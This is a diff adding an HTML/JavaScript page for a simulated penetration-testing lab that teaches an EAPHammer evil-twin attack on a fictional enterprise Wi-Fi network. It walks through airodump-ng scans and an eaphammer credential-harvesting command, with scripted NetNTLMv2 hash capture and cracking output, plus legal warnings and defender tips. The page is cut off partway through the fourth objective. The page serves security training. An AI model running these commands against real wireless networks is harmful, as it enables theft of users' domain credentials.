@@ -1,0 +1,1349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EAPHammer Evil Twin - WifiForge Lab 05 | Hexworth Prime</title>
+    <!-- Access control must fire before any content renders -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <script src="../../../../components/LinuxTerminal.js"></script>
+    <style>
+        /* ── Reset & Base ─────────────────────────────────────────── */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0a0508;
+            color: #c4b5d4;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Subtle purple ambient glow behind content */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse at 20% 25%, rgba(147, 51, 234, 0.12) 0%, transparent 55%),
+                radial-gradient(ellipse at 80% 75%, rgba(168, 85, 247, 0.08) 0%, transparent 55%),
+                radial-gradient(ellipse at 50% 50%, rgba(88, 28, 135, 0.06) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* ── Header ───────────────────────────────────────────────── */
+        .header {
+            background: rgba(10, 5, 15, 0.97);
+            border-bottom: 1px solid rgba(147, 51, 234, 0.25);
+            padding: 14px 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+            position: sticky;
+            top: 0;
+            z-index: 200;
+            backdrop-filter: blur(12px);
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .back-link {
+            color: #7c3aed;
+            text-decoration: none;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            border-radius: 6px;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+        .back-link:hover {
+            background: rgba(147, 51, 234, 0.12);
+            border-color: rgba(147, 51, 234, 0.3);
+            color: #a855f7;
+        }
+
+        .header-badge {
+            background: rgba(147, 51, 234, 0.2);
+            color: #c084fc;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 0.72rem;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            font-weight: 600;
+            border: 1px solid rgba(147, 51, 234, 0.3);
+        }
+
+        .header h1 {
+            font-size: 1.15rem;
+            color: #a855f7;
+            font-weight: 600;
+            letter-spacing: 0.02em;
+        }
+
+        /* Score display in header */
+        .header-score {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            color: #9ca3af;
+        }
+        .score-value {
+            color: #a855f7;
+            font-weight: 700;
+            font-size: 1.1rem;
+            font-variant-numeric: tabular-nums;
+        }
+
+        /* ── Layout: Terminal + Sidebar ───────────────────────────── */
+        .main-container {
+            display: grid;
+            grid-template-columns: 1fr 370px;
+            flex: 1;
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ── Left: Terminal Panel ─────────────────────────────────── */
+        .terminal-panel {
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid rgba(147, 51, 234, 0.2);
+            overflow: hidden;
+        }
+
+        /* Ethical warning — always visible above terminal */
+        .ethical-warning-banner {
+            background: linear-gradient(135deg, rgba(220, 38, 38, 0.18), rgba(153, 27, 27, 0.12));
+            border-bottom: 1px solid rgba(220, 38, 38, 0.4);
+            padding: 10px 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-shrink: 0;
+        }
+        .warning-icon {
+            font-size: 1.1rem;
+            flex-shrink: 0;
+        }
+        .warning-text {
+            font-size: 0.78rem;
+            color: #fca5a5;
+            line-height: 1.4;
+        }
+        .warning-text strong {
+            color: #ef4444;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        /* Current objective prompt strip above terminal */
+        .task-prompt {
+            background: rgba(0, 0, 0, 0.35);
+            padding: 16px 24px;
+            border-bottom: 1px solid rgba(147, 51, 234, 0.15);
+            flex-shrink: 0;
+        }
+        .task-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .task-number {
+            background: #9333ea;
+            color: #fff;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.82rem;
+            flex-shrink: 0;
+        }
+        .task-number.completed { background: #22c55e; }
+        .task-number.skipped   { background: #f59e0b; }
+
+        .task-meta {
+            font-size: 0.8rem;
+            color: #6b7280;
+        }
+        .task-meta span {
+            color: #9ca3af;
+        }
+
+        .task-question {
+            font-size: 0.97rem;
+            color: #e5e7eb;
+            line-height: 1.55;
+        }
+        .task-question code {
+            background: rgba(147, 51, 234, 0.2);
+            padding: 1px 7px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #c084fc;
+            font-size: 0.9em;
+        }
+
+        .task-hint {
+            font-size: 0.82rem;
+            color: #6b7280;
+            margin-top: 6px;
+            font-style: italic;
+            display: none;
+        }
+        .task-hint.show {
+            display: block;
+            color: #f59e0b;
+        }
+        .task-hint::before {
+            content: 'Hint: ';
+            font-weight: 600;
+        }
+
+        /* Terminal fills remaining space */
+        .terminal-container {
+            flex: 1;
+            min-height: 0;
+        }
+
+        /* Feedback bar below terminal */
+        .feedback-bar {
+            background: rgba(0, 0, 0, 0.45);
+            padding: 11px 24px;
+            border-top: 1px solid rgba(147, 51, 234, 0.15);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+            flex-shrink: 0;
+        }
+        .feedback-message {
+            font-size: 0.85rem;
+            color: #6b7280;
+            flex: 1;
+            min-width: 0;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .feedback-message.success { color: #22c55e; }
+        .feedback-message.error   { color: #ef4444; }
+
+        .bar-actions {
+            display: flex;
+            gap: 8px;
+            flex-shrink: 0;
+        }
+        .hint-btn, .skip-btn {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .hint-btn {
+            color: #6b7280;
+        }
+        .hint-btn:hover {
+            background: rgba(147, 51, 234, 0.1);
+            border-color: rgba(147, 51, 234, 0.3);
+            color: #a855f7;
+        }
+        .skip-btn {
+            color: #6b7280;
+        }
+        .skip-btn:hover {
+            background: rgba(245, 158, 11, 0.1);
+            border-color: rgba(245, 158, 11, 0.3);
+            color: #f59e0b;
+        }
+        .hint-btn:disabled, .skip-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        /* ── Right: Sidebar ───────────────────────────────────────── */
+        .sidebar {
+            background: rgba(8, 4, 14, 0.97);
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .sidebar-section-title {
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: #7c3aed;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(147, 51, 234, 0.2);
+        }
+
+        /* Mission brief callout */
+        .mission-brief {
+            background: rgba(147, 51, 234, 0.07);
+            border-left: 3px solid #9333ea;
+            padding: 10px 14px;
+            border-radius: 0 8px 8px 0;
+        }
+        .mission-brief p {
+            font-size: 0.8rem;
+            color: #9ca3af;
+            line-height: 1.55;
+        }
+        .mission-brief strong {
+            color: #c084fc;
+        }
+
+        /* Legal warning in sidebar */
+        .sidebar-warning {
+            background: linear-gradient(135deg, rgba(220, 38, 38, 0.12), rgba(153, 27, 27, 0.08));
+            border: 1px solid rgba(220, 38, 38, 0.35);
+            border-radius: 8px;
+            padding: 11px 14px;
+        }
+        .sidebar-warning-label {
+            font-size: 0.68rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: #ef4444;
+            margin-bottom: 5px;
+        }
+        .sidebar-warning-text {
+            font-size: 0.77rem;
+            color: #fca5a5;
+            line-height: 1.45;
+        }
+
+        /* Progress bar */
+        .progress-section {}
+        .progress-bar-track {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 6px;
+            height: 7px;
+            overflow: hidden;
+            margin: 10px 0 7px;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #9333ea, #a855f7);
+            border-radius: 6px;
+            transition: width 0.5s ease;
+            width: 0%;
+        }
+        .progress-stats {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+            color: #6b7280;
+            margin-bottom: 14px;
+        }
+        .progress-stats .pct { color: #a855f7; font-weight: 600; }
+
+        /* Objectives list */
+        .objectives-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .obj-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 9px;
+            padding: 8px 10px;
+            border-radius: 7px;
+            background: rgba(255, 255, 255, 0.02);
+            border-left: 3px solid #1f2937;
+            font-size: 0.77rem;
+            color: #6b7280;
+            transition: all 0.25s ease;
+            line-height: 1.4;
+        }
+        .obj-item.active {
+            border-left-color: #9333ea;
+            background: rgba(147, 51, 234, 0.1);
+            color: #e5e7eb;
+        }
+        .obj-item.completed {
+            border-left-color: #22c55e;
+            color: #4ade80;
+        }
+        .obj-item.skipped {
+            border-left-color: #f59e0b;
+            color: #f59e0b;
+            opacity: 0.65;
+        }
+
+        .obj-check {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #1f2937;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.58rem;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+        .obj-item.active    .obj-check { border-color: #9333ea; }
+        .obj-item.completed .obj-check { border-color: #22c55e; background: #22c55e; color: #000; }
+        .obj-item.skipped   .obj-check { border-color: #f59e0b; background: #f59e0b; color: #000; }
+
+        /* Defender insight box — reveals after each completion */
+        .defender-box {
+            background: rgba(59, 130, 246, 0.07);
+            border: 1px solid rgba(59, 130, 246, 0.25);
+            border-radius: 8px;
+            padding: 10px 13px;
+            display: none;
+        }
+        .defender-box.show { display: block; }
+        .defender-box-title {
+            font-size: 0.67rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: #3b82f6;
+            margin-bottom: 4px;
+        }
+        .defender-box-text {
+            font-size: 0.77rem;
+            color: #93c5fd;
+            line-height: 1.45;
+        }
+
+        /* Score breakdown widget */
+        .score-widget {
+            background: rgba(147, 51, 234, 0.06);
+            border: 1px solid rgba(147, 51, 234, 0.2);
+            border-radius: 8px;
+            padding: 12px 14px;
+        }
+        .score-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+            color: #6b7280;
+            padding: 3px 0;
+        }
+        .score-row .val { color: #c4b5d4; font-weight: 600; font-variant-numeric: tabular-nums; }
+        .score-row.total {
+            border-top: 1px solid rgba(147, 51, 234, 0.2);
+            margin-top: 6px;
+            padding-top: 8px;
+            color: #a855f7;
+            font-weight: 700;
+        }
+        .score-row.total .val { color: #a855f7; font-size: 1.05rem; }
+
+        /* ── Completion Modal ──────────────────────────────────────── */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.92);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-overlay.show { display: flex; }
+
+        .modal {
+            background: linear-gradient(145deg, #0d0814, #150b20);
+            border: 2px solid #9333ea;
+            border-radius: 18px;
+            padding: 44px 48px;
+            text-align: center;
+            max-width: 520px;
+            width: 90%;
+            box-shadow: 0 0 60px rgba(147, 51, 234, 0.3);
+            animation: modalIn 0.35s ease;
+        }
+        @keyframes modalIn {
+            from { opacity: 0; transform: scale(0.92) translateY(16px); }
+            to   { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .modal.perfect { border-color: #22c55e; box-shadow: 0 0 60px rgba(34, 197, 94, 0.25); }
+
+        .modal-icon { font-size: 3.6rem; margin-bottom: 14px; }
+        .modal h2 { color: #a855f7; font-size: 1.65rem; margin-bottom: 8px; }
+        .modal.perfect h2 { color: #22c55e; }
+        .modal p { color: #6b7280; font-size: 0.9rem; margin-bottom: 22px; line-height: 1.5; }
+
+        .modal-stats {
+            display: flex;
+            justify-content: center;
+            gap: 36px;
+            margin-bottom: 28px;
+        }
+        .modal-stat { text-align: center; }
+        .modal-stat-value {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #fff;
+            font-variant-numeric: tabular-nums;
+        }
+        .modal-stat-value.good  { color: #22c55e; }
+        .modal-stat-value.warn  { color: #f59e0b; }
+        .modal-stat-value.pts   { color: #a855f7; }
+        .modal-stat-label { font-size: 0.82rem; color: #6b7280; margin-top: 4px; }
+
+        .modal-btns {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+        }
+        .modal-btn {
+            padding: 11px 26px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-block;
+            transition: all 0.2s ease;
+        }
+        .modal-btn.primary {
+            background: linear-gradient(135deg, #9333ea, #a855f7);
+            color: #fff;
+        }
+        .modal-btn.primary:hover { opacity: 0.88; }
+        .modal-btn.secondary {
+            background: rgba(255, 255, 255, 0.07);
+            color: #c4b5d4;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+        .modal-btn.secondary:hover { background: rgba(255, 255, 255, 0.12); }
+
+        /* ── Responsive: hide sidebar on small screens ─────────────── */
+        @media (max-width: 960px) {
+            .main-container { grid-template-columns: 1fr; }
+            .sidebar { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ── Header ──────────────────────────────────────────────────── -->
+    <header class="header">
+        <div class="header-left">
+            <a href="../index.html" class="back-link">&larr; WiFi Arsenal</a>
+            <span class="header-badge">WifiForge Lab</span>
+            <h1>EAPHammer Evil Twin</h1>
+        </div>
+        <div class="header-score">
+            Score: <span class="score-value" id="headerScore">100</span>
+        </div>
+    </header>
+
+    <!-- ── Main layout ─────────────────────────────────────────────── -->
+    <div class="main-container">
+
+        <!-- ── Left: Terminal Panel ──────────────────────────────── -->
+        <section class="terminal-panel">
+
+            <!-- Ethical warning banner (always visible) -->
+            <div class="ethical-warning-banner">
+                <span class="warning-icon">&#9888;</span>
+                <p class="warning-text">
+                    <strong>Enterprise Authorization Required.</strong>
+                    Deploying a rogue access point or impersonating an enterprise 802.1X network without explicit written authorization violates the CFAA, ECPA, and equivalent statutes worldwide. NetNTLM hash capture constitutes credential theft. This simulation is strictly for authorized penetration testing education.
+                </p>
+            </div>
+
+            <!-- Current objective prompt -->
+            <div class="task-prompt">
+                <div class="task-header">
+                    <div style="display:flex;align-items:center;gap:10px;">
+                        <div class="task-number" id="taskNumber">1</div>
+                        <div class="task-question" id="taskQuestion">Loading...</div>
+                    </div>
+                    <span class="task-meta">Objective <span id="currentTaskNum">1</span> of <span id="totalTasks">8</span></span>
+                </div>
+                <div class="task-hint" id="taskHint"></div>
+            </div>
+
+            <!-- LinuxTerminal mounts here -->
+            <div class="terminal-container" id="terminal"></div>
+
+            <!-- Feedback bar -->
+            <div class="feedback-bar">
+                <div class="feedback-message" id="feedbackMessage">Type a command to begin. Try <code style="background:rgba(147,51,234,0.2);padding:1px 5px;border-radius:3px;color:#c084fc;">help</code> or <code style="background:rgba(147,51,234,0.2);padding:1px 5px;border-radius:3px;color:#c084fc;">objectives</code></div>
+                <div class="bar-actions">
+                    <button class="hint-btn" id="hintBtn" onclick="showHint()">Hint (-5 pts)</button>
+                    <button class="skip-btn" id="skipBtn" onclick="skipTask()">Skip</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── Right: Sidebar ────────────────────────────────────── -->
+        <aside class="sidebar">
+
+            <!-- Mission Brief -->
+            <div>
+                <div class="sidebar-section-title">Mission Brief</div>
+                <div class="mission-brief">
+                    <p>
+                        You are conducting an authorized wireless assessment against
+                        <strong>MegaCorp</strong>. Your objective is to identify and
+                        impersonate the enterprise WPA2-Enterprise network
+                        <strong>MegaCorp-Secure</strong>, capture Active Directory
+                        <strong>NetNTLMv2 hashes</strong> from domain clients that
+                        auto-connect to your rogue AP, then crack the hashes offline
+                        using John the Ripper.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Legal Warning -->
+            <div class="sidebar-warning">
+                <div class="sidebar-warning-label">Legal Warning</div>
+                <div class="sidebar-warning-text">
+                    Enterprise evil twin attacks capture Active Directory credentials.
+                    This constitutes unauthorized access AND credential theft under
+                    18 U.S.C. 1030 (CFAA) and 18 U.S.C. 2511 (ECPA). Penalties
+                    include federal imprisonment. Explicit written scope authorization
+                    is mandatory before any rogue AP deployment.
+                </div>
+            </div>
+
+            <!-- Progress -->
+            <div class="progress-section">
+                <div class="sidebar-section-title">Progress</div>
+                <div class="progress-bar-track">
+                    <div class="progress-bar-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-stats">
+                    <span><span id="completedCount">0</span> / 8 objectives</span>
+                    <span class="pct" id="progressPct">0%</span>
+                </div>
+            </div>
+
+            <!-- Objectives list -->
+            <div>
+                <div class="sidebar-section-title">Objectives</div>
+                <ul class="objectives-list" id="objList"></ul>
+            </div>
+
+            <!-- Score breakdown -->
+            <div class="score-widget">
+                <div class="sidebar-section-title" style="margin-bottom:8px;">Score</div>
+                <div class="score-row"><span>Base</span><span class="val">100 pts</span></div>
+                <div class="score-row"><span>Hints used</span><span class="val" id="scoreHintDeduct">-0 pts</span></div>
+                <div class="score-row total"><span>Total</span><span class="val" id="scoreFinal">100</span></div>
+            </div>
+
+            <!-- Defender insight (populates after each objective) -->
+            <div class="defender-box" id="defenderBox">
+                <div class="defender-box-title">Defender's Perspective</div>
+                <div class="defender-box-text" id="defenderText"></div>
+            </div>
+
+        </aside>
+    </div>
+
+    <!-- ── Completion Modal ──────────────────────────────────────────── -->
+    <div class="modal-overlay" id="resultsModal">
+        <div class="modal" id="modalContent">
+            <div class="modal-icon" id="modalIcon">&#127942;</div>
+            <h2 id="modalTitle">Lab Complete!</h2>
+            <p id="modalMessage">EAPHammer evil twin workflow mastered.</p>
+            <div class="modal-stats">
+                <div class="modal-stat">
+                    <div class="modal-stat-value good" id="modalCompleted">0</div>
+                    <div class="modal-stat-label">Completed</div>
+                </div>
+                <div class="modal-stat">
+                    <div class="modal-stat-value warn" id="modalSkipped">0</div>
+                    <div class="modal-stat-label">Skipped</div>
+                </div>
+                <div class="modal-stat">
+                    <div class="modal-stat-value pts" id="modalScore">100</div>
+                    <div class="modal-stat-label">Points</div>
+                </div>
+            </div>
+            <div class="modal-btns">
+                <button class="modal-btn primary" onclick="restartLab()">Restart Lab</button>
+                <a href="../index.html" class="modal-btn secondary">Back to WiFi Arsenal</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    /* ═══════════════════════════════════════════════════════════════
+       WifiForge Lab 05 — EAPHammer Evil Twin
+       Enterprise credential capture via rogue 802.1X access point.
+       WiFi Arsenal / Dark Arts Vault
+    ═══════════════════════════════════════════════════════════════ */
+
+    /* ── Simulated wireless environment constants ─────────────────── */
+    const CORP_BSSID    = 'AA:BB:CC:DD:EE:01';   // MegaCorp-Secure (WPA2-Enterprise, CH 1)
+    const GUEST_BSSID   = 'AA:BB:CC:DD:EE:02';   // MegaCorp-Guest (WPA2-PSK, CH 6)
+    const CLIENT1_MAC   = '00:11:22:33:44:01';   // jsmith-laptop (domain-joined)
+    const CLIENT2_MAC   = '00:11:22:33:44:02';   // admin-workstation (domain-joined)
+    const ROGUE_BSSID   = 'AA:BB:CC:DD:EE:88';   // EAPHammer rogue AP BSSID (spoofed)
+    const CORP_SSID     = 'MegaCorp-Secure';
+    const DOMAIN        = 'MEGACORP';
+
+    /* ── Captured NetNTLMv2 hash for jsmith (pre-computed simulation) */
+    const CAPTURED_HASH = `jsmith::MEGACORP:a3f8b2c19d047e6a:8B3A1C9D2F047E6A4C8B3D1F9A2E5C7D:010100000000000080A6B3C2D1E4F5060102030405060708000000000200080045004400430041000000`;
+
+    /* ── Score state ─────────────────────────────────────────────── */
+    const score = { base: 100, hints: 0 };
+
+    /* ── Airodump-ng initial passive scan output ────────────────────
+       Shows both the enterprise AP and guest AP with connected clients. */
+    const AIRODUMP_PASSIVE = `
+<span style="color:#6b7280;">CH  6 ][ Elapsed: 18 s ][ 2025-09-22 08:14:07</span>
+
+<span style="color:#22c55e;"> BSSID              PWR  Beacons  #Data  CH   MB   ENC      CIPHER AUTH    ESSID</span>
+
+<span style="color:#c4b5d4;"> ${CORP_BSSID}  -42      248     84   1  130   WPA2     CCMP   MGT     MegaCorp-Secure</span>
+<span style="color:#c4b5d4;"> ${GUEST_BSSID}  -55      191     31   6  130   WPA2     CCMP   PSK     MegaCorp-Guest</span>
+<span style="color:#c4b5d4;"> 11:22:33:44:55:66  -71       88      7  11   54   WPA2     CCMP   PSK     Netgear_5F2A</span>
+<span style="color:#c4b5d4;"> 77:88:99:AA:BB:CC  -78       44      0   6   54   OPN                      xfinitywifi</span>
+
+<span style="color:#22c55e;"> BSSID              STATION            PWR   Rate   Lost   Frames  Probe</span>
+
+<span style="color:#c4b5d4;"> ${CORP_BSSID}  ${CLIENT1_MAC}  -46   54e-54     0       61  MegaCorp-Secure</span>
+<span style="color:#c4b5d4;"> ${CORP_BSSID}  ${CLIENT2_MAC}  -53   54e-11     0       23  MegaCorp-Secure</span>
+<span style="color:#c4b5d4;"> ${GUEST_BSSID}  AA:BB:CC:11:22:03  -63   11e-11     0        9  MegaCorp-Guest</span>`;
+
+    /* ── EAPHammer launch output ────────────────────────────────────
+       Rogue AP comes up, begins broadcasting on same channel as target. */
+    const EAPHAMMER_LAUNCH = `
+<span style="color:#6b7280;">[*] Loading hostapd-eaphammer...</span>
+<span style="color:#6b7280;">[*] Generating rogueAP certificate for: MegaCorp-Secure</span>
+<span style="color:#6b7280;">[*] CA certificate written to: /opt/eaphammer/certs/ca.pem</span>
+<span style="color:#6b7280;">[*] Server certificate written to: /opt/eaphammer/certs/server.pem</span>
+<span style="color:#a855f7;">[*] Starting hostapd-eaphammer rogue AP...</span>
+<span style="color:#22c55e;">[+] Rogue AP running:
+    SSID      : MegaCorp-Secure
+    BSSID     : ${ROGUE_BSSID}
+    Channel   : 1
+    Auth      : WPA2-Enterprise (PEAP/MSCHAPv2)
+    Interface : a-wlan0</span>
+<span style="color:#a855f7;">[*] EAP server listening for 802.1X associations...
+[*] Credential capture mode: ENABLED
+[*] Hash output: /opt/eaphammer/loot/</span>`;
+
+    /* ── Hash capture event output ──────────────────────────────────
+       jsmith-laptop auto-connects, PEAP inner auth MS-CHAPv2 captured. */
+    const HASH_CAPTURE_OUTPUT = `
+<span style="color:#6b7280;">[*] Received 802.11 Probe Request from ${CLIENT1_MAC} for MegaCorp-Secure</span>
+<span style="color:#6b7280;">[*] Client ${CLIENT1_MAC} associating to rogue AP...</span>
+<span style="color:#6b7280;">[*] 802.1X EAP-Start received from ${CLIENT1_MAC}</span>
+<span style="color:#6b7280;">[*] Sending EAP-Request/Identity</span>
+<span style="color:#6b7280;">[*] EAP-Response/Identity: jsmith@megacorp.local</span>
+<span style="color:#6b7280;">[*] Initiating PEAP tunnel...</span>
+<span style="color:#6b7280;">[*] TLS handshake completed (client accepted our rogue cert)</span>
+<span style="color:#6b7280;">[*] Inner tunnel: MSCHAPv2 challenge-response received</span>
+<span style="color:#22c55e;">[+] NetNTLMv2 hash captured!
+    Username : jsmith
+    Domain   : MEGACORP
+    Hash     : ${CAPTURED_HASH}
+[+] Hash written to: /opt/eaphammer/loot/hashes.txt</span>`;
+
+    /* ── loot directory listing ──────────────────────────────────── */
+    const LOOT_LISTING = `total 12
+-rw-r--r-- 1 root root  184 Sep 22 08:19 hashes.txt
+-rw-r--r-- 1 root root 1841 Sep 22 08:14 eaphammer.log
+-rw-r--r-- 1 root root  512 Sep 22 08:13 ca.pem`;
+
+    /* ── John the Ripper crack output ───────────────────────────────
+       Mask attack: Badpass?d matches Badpass0–Badpass9. Badpass1 hits. */
+    const JOHN_CRACK_OUTPUT = `Using default input encoding: UTF-8
+Loaded 1 password hash (netntlm, NTLMv1 C/R [MD4 DES (and variants) 256/256 AVX2 8x3])
+No password hashes left to crack (see FAQ)
+<span style="color:#6b7280;">Note: 0 hashes cracked, 1 left -- resuming...</span>
+
+<span style="color:#6b7280;">Press 'q' or Ctrl-C to abort, almost any other key for status</span>
+
+<span style="color:#6b7280;">Using mask: Badpass?d</span>
+<span style="color:#6b7280;">Generating candidates: Badpass0, Badpass1, Badpass2 ...</span>
+
+<span style="color:#22c55e;">Badpass1         (jsmith::MEGACORP)</span>
+
+1g 0:00:00:01 DONE (2025-09-22 08:24:11) 1.000g/s 10.00p/s 10.00c/s 10.00C/s Badpass0..Badpass9
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.`;
+
+    /* ── john --show verification output ─────────────────────────── */
+    const JOHN_SHOW_OUTPUT = `jsmith::MEGACORP:${CAPTURED_HASH.split(':').slice(2).join(':')}:Badpass1
+
+1 password hash cracked, 0 left`;
+
+    /* ── Task definitions ────────────────────────────────────────── */
+    const TASKS = [
+        {
+            /* Phase 1 – Passive wireless scan: identify enterprise networks */
+            id: 1,
+            question: 'Passively scan all channels with <code>airodump-ng wlan0mon</code> to identify WPA2-Enterprise networks and connected clients',
+            hint: 'airodump-ng wlan0mon',
+            validate: c => c.trim().startsWith('airodump-ng') && c.includes('wlan0mon') && !c.includes('--bssid') && !c.includes('-c '),
+            response: AIRODUMP_PASSIVE,
+            successMessage: 'Two MegaCorp APs discovered. MegaCorp-Secure (AA:BB:CC:DD:EE:01) on CH 1 shows AUTH=MGT — that is 802.1X, meaning clients authenticate with Active Directory credentials rather than a shared PSK. Two domain clients are associated: jsmith-laptop and admin-workstation. These are our targets.',
+            defender: 'Every enterprise SSID is visible to any attacker running airodump-ng within range. Use 802.11w Management Frame Protection and consider SSID cloaking for internal-only SSIDs — though determined attackers can still discover them via probe responses.'
+        },
+        {
+            /* Phase 2 – Identify target SSID and note 802.1X AUTH field */
+            id: 2,
+            question: 'Confirm the enterprise network parameters with <code>airodump-ng --bssid AA:BB:CC:DD:EE:01 wlan0mon</code> to isolate the target AP and its clients',
+            hint: 'airodump-ng --bssid AA:BB:CC:DD:EE:01 wlan0mon',
+            validate: c =>
+                c.includes('airodump-ng') &&
+                c.includes('--bssid') && c.includes(CORP_BSSID) &&
+                c.includes('wlan0mon'),
+            response: `
+<span style="color:#6b7280;">CH  1 ][ Elapsed: 8 s ][ 2025-09-22 08:16:44</span>
+
+<span style="color:#22c55e;"> BSSID              PWR  Beacons  #Data  CH   MB   ENC      CIPHER AUTH    ESSID</span>
+
+<span style="color:#c4b5d4;"> ${CORP_BSSID}  -42      114     91   1  130   WPA2     CCMP   <span style="color:#a855f7;">MGT</span>     MegaCorp-Secure</span>
+
+<span style="color:#22c55e;"> BSSID              STATION            PWR   Rate   Lost   Frames  Probe</span>
+
+<span style="color:#c4b5d4;"> ${CORP_BSSID}  ${CLIENT1_MAC}  -46   54e-54     0       74  MegaCorp-Secure</span>
+<span style="color:#c4b5d4;"> ${CORP_BSSID}  ${CLIENT2_MAC}  -53   54e-11     0       29  MegaCorp-Secure</span>
+
+<span style="color:#a855f7;">[!] AUTH=MGT confirms 802.1X EAP authentication (WPA2-Enterprise)
+    Domain clients will submit PEAP/MSCHAPv2 credentials upon association.
+    Target SSID : MegaCorp-Secure
+    Channel     : 1
+    Client 1    : ${CLIENT1_MAC} (jsmith-laptop)
+    Client 2    : ${CLIENT2_MAC} (admin-workstation)</span>`,
+            successMessage: 'Confirmed: AUTH=MGT means 802.1X is in use. When domain clients see our rogue AP broadcasting the same SSID, their supplicant will attempt PEAP/MSCHAPv2 authentication — sending the user\'s AD credentials through our rogue EAP server, which logs the NetNTLMv2 challenge-response.',
+            defender: 'EAP server certificate validation is the primary defense. Clients configured with "validate server certificate" and a pinned CA will reject the rogue RADIUS server\'s self-signed certificate. Enforce this in Group Policy under Wireless Network Policies (802.1X) and use certificate-based EAP-TLS instead of PEAP/MSCHAPv2 where possible.'
+        },
+        {
+            /* Phase 3 – Launch EAPHammer rogue AP */
+            id: 3,
+            question: 'Launch the EAPHammer rogue AP targeting MegaCorp-Secure with <code>eaphammer -e MegaCorp-Secure --creds --interface a-wlan0</code>',
+            hint: 'eaphammer -e MegaCorp-Secure --creds --interface a-wlan0',
+            validate: c =>
+                c.includes('eaphammer') &&
+                (c.includes('-e') || c.includes('--essid')) &&
+                c.includes('MegaCorp-Secure') &&
+                c.includes('--creds') &&
+                (c.includes('--interface') || c.includes('-i')) &&
+                c.includes('a-wlan0'),
+            response: EAPHAMMER_LAUNCH,
+            successMessage: 'EAPHammer rogue AP is live on CH 1 broadcasting MegaCorp-Secure. It auto-generated a self-signed certificate for the RADIUS server and is running hostapd with WPA2-Enterprise. The --creds flag enables credential harvesting — any MSCHAPv2 challenge-response will be captured and written to /opt/eaphammer/loot/hashes.txt.',
+            defender: 'Wireless intrusion detection systems (WIDS) like Cisco Meraki Air Marshal or Aruba RFProtect detect rogue APs by comparing beacon frames against a known AP whitelist. Any AP broadcasting your SSID from an unlisted BSSID triggers an alert. Deploy WIDS monitoring as a detective control alongside preventive certificate pinning.'
+        },
+        {
+            /* Phase 4 – Wait for client auto-connection and hash capture */
+            id: 4,
